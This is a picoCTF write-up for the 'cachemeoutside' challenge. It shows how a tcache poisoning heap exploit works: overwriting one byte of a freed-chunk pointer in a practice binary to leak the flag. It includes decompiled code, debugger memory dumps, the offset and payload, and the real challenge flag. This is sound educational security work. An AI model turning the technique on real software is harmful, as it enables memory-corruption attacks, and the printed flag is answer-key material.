# cachemeoutside

tcache exploit

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/cachemeoutside/heapedit_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

Although PIE is disabled, ASLR is still applied to the heap. However, the heap will retain the same offsets between each chunk, so our tcache exploit will still work if we only play around with the offsets between chunks. 

Also, note that the heap will always be aligned to a page boundary of 0x1000. 

## General functionality of heapedit

The following code snipplets are taken from Ghidra (with renames). 

The summary is that `heapedit` requests for 0x80 bytes of space on the heap 9 times through `ptmalloc` as shown. Notice how these chunks contain the flag (see the call to `strcat`). 

```c
for (i = 0; i < 7; i = i + 1) {
  heapPtr = (undefined8 *)malloc(0x80);
  if (heapAddr == (undefined8 *)0x0) {
    heapAddr = heapPtr;
  }
  *heapPtr = 0x73746172676e6f43;
  heapPtr[1] = 0x662072756f592021;
  heapPtr[2] = 0x203a73692067616c;
  *(undefined *)(heapPtr + 3) = 0;
  strcat((char *)heapPtr,flagBuffer);
}
local_88 = (undefined8 *)malloc(0x80);
```

before freeing 2 chunks of that allocated memory

```c
free(heapPtr);
free(local_88);
```

It then allows us to edit a byte of the heap if we specify the value to change it to, and the offset from some address on the heap which, evaluated, is the address which byte we are editing. 

```c
puts("You may edit one byte in the program.");
printf("Address: ");
__isoc99_scanf("%d",&input.address);
printf("Value: ");
__isoc99_scanf(" %c",&input.value);
*(undefined *)((long)input.address + (long)heapAddr) = input.value;
```

Lastly, it allocates a heap chunk and prints it out starting from the 17th byte in the user data section

```c
local_80 = malloc(0x80);
puts((char *)((long)local_80 + 0x10));
```

## Address of the tcache entry

Let us first assume that there is no ASLR. 

Knowing that the tcache is the first chunk on the heap, we can find the address of the tcache by simply listing the chunks of the heap using gef

```bash
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
```

Note that this is occurring after two calls by the program to `free` two chunks of the same size, so the tcache currently tracks those two chunks. 

We dump the memory at 0x602010 to examine the tcache in more detail

```bash
gef➤  x/20gx 0x602010
0x602010:       0x0200000000000000      0x0000000000000000
0x602020:       0x0000000000000000      0x0000000000000000
0x602030:       0x0000000000000000      0x0000000000000000
0x602040:       0x0000000000000000      0x0000000000000000
0x602050:       0x0000000000000000      0x0000000000000000
0x602060:       0x0000000000000000      0x0000000000000000
0x602070:       0x0000000000000000      0x0000000000000000
0x602080:       0x0000000000000000      0x0000000000603890
0x602090:       0x0000000000000000      0x0000000000000000
0x6020a0:       0x0000000000000000      0x0000000000000000
```

Note that the first 8 bytes dumped is actually 00 00 00 00 00 00 00 02, but is displayed in reverse as gdb (gef) treats it as a little-endian long int. 

Recall that the tcache consists of a char array `counts` and chunk pointer (which is typed as `tcache_entry*`) array that are both of size `TCACHE_MAX_BINS`, which is by default 64. The char array starts at 0x602010 (which is the start of user data in a chunk and thus the start of the struct and also for a tcache struct the start of the char array), so we see that `counts[7] = 2` (byte-sized integer). 

64 bytes later is the `entries` array of `tcache_entry*`s, which is at the address `0x602010 + 0x40 = 0x602050`. 

Notice how the non-null pointer at 0x602088 is at index `(0x602088 - 0x602050) / 8 = 7`, which corresponds to the index of `counts` which has a nonzero entry of 2. 

This gives us extra confirmation that the address of the tcache entry is 0x602088. 

## Finding the base write adddress

Recall from [here](#general-functionality-of-heapedit) that the C code handling user input is as follows

```c
puts("You may edit one byte in the program.");
printf("Address: ");
__isoc99_scanf("%d",&input.address);
printf("Value: ");
__isoc99_scanf(" %c",&input.value);
*(undefined *)((long)input.address + (long)heapAddr) = input.value;
```

Note the renaming of quite a few variables in Ghidra - input.address, input.value and heapAddr. 

We want to find the base write address, and that is `heapAddr`. We can find this by examining the assembly for the last line of the code block shown above 

```x86asm
00400a29 8b  85  60       MOV        EAX ,dword ptr [RBP  + input.address ]
          ff  ff  ff
00400a2f 48  63  d0       MOVSXD     RDX ,EAX
00400a32 48  8b  85       MOV        RAX ,qword ptr [RBP  + heapAddr ]
          68  ff  ff  ff
00400a39 48  01  c2       ADD        RDX ,RAX
00400a3c 0f  b6  85       MOVZX      EAX ,byte ptr [RBP  + input.value ]
          5f  ff  ff  ff
00400a43 88  02           MOV        byte ptr [RDX ],AL
```

Specifically, we can set a breakpoint at 0x400a39 and dump the value of %rax. This gives us

```bash
gef➤  p $rax
$1 = 0x6034a0
```

so the base write address (without ASLR) provided to us is 0x6034a0. 

## Offset from the base write address to write to the tcache entry

The offset from the base write addr to the tcache entry is `0x602088 - 0x6034a0 = -5144`. 

Since the read takes in a signed integer (see below), we need not exploit integer overflow to make it negative

```c
__isoc99_scanf("%d",&input.address);
```

Now we need to figure out the value of the 1 byte we want to write into any byte of the tcache entry. 

## Motivation for finding the address of the tcache entry

Before we move onto figuring out the byte value to write into the tcache entry, let us briefly discuss why changing the tcache entry can help us to leak the flag. We begin with the motivation behind tcache. 

`ptmalloc` is an expensive operation, as it needs to look for a free chunk of sufficient size and this can involve enumerating over a large number of free chunks that are stored in a doubly-linked list. 

But what if we free a chunk that coincidentally used the same amount of memory has we shall allocate in the future? If we are able to keep track of these freed chunks, then `ptmalloc` can simply allocate those chunks when a chunk of at most that size is required! 

This sidesteps the (very likely) expensive enumeration process. 

Now, back to the challenge. Recall from [here](#general-functionality-of-heapedit) that after our input is taken, the program runs the following code

```c
local_80 = malloc(0x80);
puts((char *)((long)local_80 + 0x10));
```

where a call to `ptmalloc` for the same amount of the memory (as the previous `ptmalloc`s) occurs. 

This is exactly how the tcache is designed to be used. Since tcache entries are LIFO, the second freed chunk (recall that the program freed two chunks) will be the one that is "re-used" and the pointer to its usable data segment will be returned by `ptmalloc`. 

Since the flag is on a number of chunks on the heap, if we can change the tcache entry to point to one of these chunks, we can leak the flag. 

## Chunk Shopping

Now we just want to choose a chunk where
1. it contains the flag, and
2. whose address is a 1 byte edit away from 0x603890 (this is the `tcache_entry*` value that was on the tcache). 

Just remember that we can overwrite a byte with a hard-coded value regardless of heap ASLR because the heap will always be aligned to the page boundary of 0x1000 i.e. the last 3 hex digits are not affected by ASLR. 

<hr> 

gef (i.e. no ASLR) enumerates the chunks on the heap after the freeing mentioned earlier is completed as follows

```bash
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602260     98 24 ad fb 00 00 00 00 90 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602490     54 45 53 54 5f 46 4c 41 47 00 00 00 00 00 00 00    TEST_FLAG.......]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

0x603800 seems like a good candidate. Even better, it was freed (if you follow the linked list that is the tcache_entry bin it goes from 0x603890 to 0x603800) and thus can "legally" be reallocated. It also contains the flag, as shown

```bash
gef➤  x/10gx 0x603800
0x603800:       0x0000000000000000      0x662072756f592021
0x603810:       0x203a73692067616c      0x414c465f54534554
0x603820:       0x0000000000000047      0x0000000000000000
0x603830:       0x0000000000000000      0x0000000000000000
0x603840:       0x0000000000000000      0x0000000000000000
```

whereby the bytes at 0x603800 + 8 are the flag string

```bash
gef➤  x/s 0x603808
0x603808:       "! Your flag is: TEST_FLAG"
```

Locally, I provided a flag.txt file containing the text "TEST_FLAG". Recall that the printing of the user data portion of the chunk is offset by +0x10, so we would be leaking

```bash
gef➤  x/s 0x603810
0x603810:       "lag is: TEST_FLAG"
```

which still works. 

Lastly, we note that writing into 0x602088 (specifically, an offset of -5144 from the base write addr) works fine because we want to overwrite LSB of the address stored at 0x602088, which is exactly the (first) byte in order at address 0x602088 for little endian. 

## Payload

The payload is thus simply the offset given by `-5144`, followed by the byte we want to write into that address, which is `\x00`. 

## Side note

Testing with gdb found that overwriting the tcache entry with the address of an already-allocated chunk still works. 

This implies that `ptmalloc` does not check for if a chunk is already allocated if pulling from tcache - it assumes that it is a freed chunk. 

NOTE: THIS ONLY WORKS FOR v2.27 OF ld. Protections were put in place from v2.28 onwards. 

## Flag

pwntools output: 

```bash
[+] Opening connection to mercury.picoctf.net on port 31153: Done
/mnt/d/CTFs/Python_Venvs/Linux_Pwn_Venv/lib/python3.10/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] picoCTF{f2d58262f377f31fddf8576b59226f2a}
[*] Closed connection to mercury.picoctf.net port 31153
```

Flag: `picoCTF{f2d58262f377f31fddf8576b59226f2a}`